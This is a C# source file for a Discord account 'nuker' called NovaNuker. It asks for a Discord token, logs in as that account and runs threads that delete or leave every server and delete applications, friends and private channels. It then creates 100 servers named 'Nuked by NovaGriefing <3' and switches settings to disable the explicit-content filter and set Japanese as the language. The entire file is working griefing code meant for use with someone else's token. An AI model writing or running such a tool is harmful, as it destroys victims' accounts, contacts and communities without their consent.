using Discord;
using Discord.Gateway;
using System;
using System.Threading;
public class NovaNuker
{
    public static DiscordSocketClient client;
    private static void Main()
    {
        Console.WriteLine(@"

  _   _  ______      __     _   _ _    _ _  ________ _____  
 | \ | |/ __ \ \    / /\   | \ | | |  | | |/ /  ____|  __ \ 
 |  \| | |  | \ \  / /  \  |  \| | |  | | ' /| |__  | |__) |
 | . ` | |  | |\ \/ / /\ \ | . ` | |  | |  < |  __| |  _  / 
 | |\  | |__| | \  / ____ \| |\  | |__| | . \| |____| | \ \ 
 |_| \_|\____/   \/_/    \_\_| \_|\____/|_|\_\______|_|  \_\
                                                            
                                                            

");
        Console.WriteLine("[+] Insert the Discord token to nuke here: ");
        string token = Console.ReadLine();
        Console.WriteLine("[+] Attempting to connect to Discord...");
        new Thread(() => NukeAccount(token)).Start();
        while (true)
        {
            Console.ReadLine();
        }
    }
    public static void NukeAccount(string token)
    {
        try
        {
            DiscordSocketConfig config = new DiscordSocketConfig();
            config.RetryOnRateLimit = true;
            config.ApiVersion = 6;
            client = new DiscordSocketClient(config);
            client.OnLoggedIn += Client_OnLoggedIn;
            client.Login(token);
            Console.WriteLine("[+] Discord token is valid! Started nuking account.");
        }
        catch (Exception)
        {
            Console.WriteLine("[-] Discord token is not valid. Failed to nuke account.");
        }
    }
    private static void Client_OnLoggedIn(DiscordSocketClient client, LoginEventArgs args)
    {
        try
        {
            new Thread(() => clearServers()).Start();
            new Thread(() => createServers()).Start();
            new Thread(() => clearApplications()).Start();
            new Thread(() => clearRelationships()).Start();
            new Thread(() => clearPrivateChannels()).Start();
            new Thread(() => changeSettings()).Start();
        }
        catch (Exception)
        {
        }
    }
    public static void clearServers()
    {
        try
        {
            foreach (PartialGuild guild in client.GetGuilds())
            {
                try
                {
                    new Thread(() => deleteServer(guild)).Start();
                }
                catch (Exception)
                {
                }
            }
        }
        catch (Exception)
        {
        }
    }
    public static void deleteServer(PartialGuild guild)
    {
        try
        {
            if (guild.Owner)
            {
                guild.Delete();
            }
            else
            {
                guild.Leave();
            }
        }
        catch (Exception)
        {
        }
    }
    public static void createServers()
    {
        try
        {
            while (true)
            {
                Thread.Sleep(1000);
                try
                {
                    int i = 0;
                    try
                    {
                        foreach (PartialGuild guild in client.GetGuilds())
                        {
                            i++;
                        }
                    }
                    catch (Exception)
                    {
                    }
                    if (i == 0)
                    {
                        for (int j = 0; j < 100; j++)
                        {
                            new Thread(() => createServer()).Start();
                        }
                        return;
                    }
                }
                catch (Exception)
                {
                }
            }
        }
        catch (Exception)
        {
        }
    }
    public static void createServer()
    {
        try
        {
            client.CreateGuild("Nuked by NovaGriefing <3");
        }
        catch (Exception)
        {
        }
    }
    public static void clearApplications()
    {
        try
        {
            foreach (OAuth2Application application in client.GetApplications())
            {
                try
                {
                    new Thread(() => deleteApplication(application)).Start();
                }
                catch (Exception)
                {
                }
            }
        }
        catch (Exception)
        {
        }
    }
    public static void deleteApplication(OAuth2Application application)
    {
        try
        {
            application.Delete();
        }
        catch (Exception)
        {
        }
    }
    public static void clearRelationships()
    {
        try
        {
            foreach (DiscordRelationship relationship in client.GetRelationships())
            {
                try
                {
                    new Thread(() => deleteRelationship(relationship)).Start();
                }
                catch (Exception)
                {
                }
            }
        }
        catch (Exception)
        {
        }
    }
    public static void deleteRelationship(DiscordRelationship relationship)
    {
        try
        {
            relationship.Remove();
        }
        catch (Exception)
        {
        }
    }
    public static void clearPrivateChannels()
    {
        try
        {
            foreach (PrivateChannel privateChannel in client.GetPrivateChannels())
            {
                try
                {
                    new Thread(() => deletePrivateChannel(privateChannel)).Start();
                }
                catch (Exception)
                {
                }
            }
        }
        catch (Exception)
        {
        }
    }
    public static void deletePrivateChannel(PrivateChannel privateChannel)
    {
        try
        {
            privateChannel.Delete();
        }
        catch (Exception)
        {
        }
    }
    public static void changeSettings()
    {
        try
        {
            UserSettingsProperties userSettings = new UserSettingsProperties();
            userSettings.CompactMessages = true;
            userSettings.DeveloperMode = true;
            userSettings.EnableTts = true;
            userSettings.ExplicitContentFilter = ExplicitContentFilter.DoNotScan;
            userSettings.Theme = DiscordTheme.Light;
            userSettings.PlayGifsAutomatically = true;
            userSettings.Language = DiscordLanguage.Japanese;
            client.GetClientUser().ChangeSettings(userSettings);
        }
        catch (Exception)
        {
        }
    }
}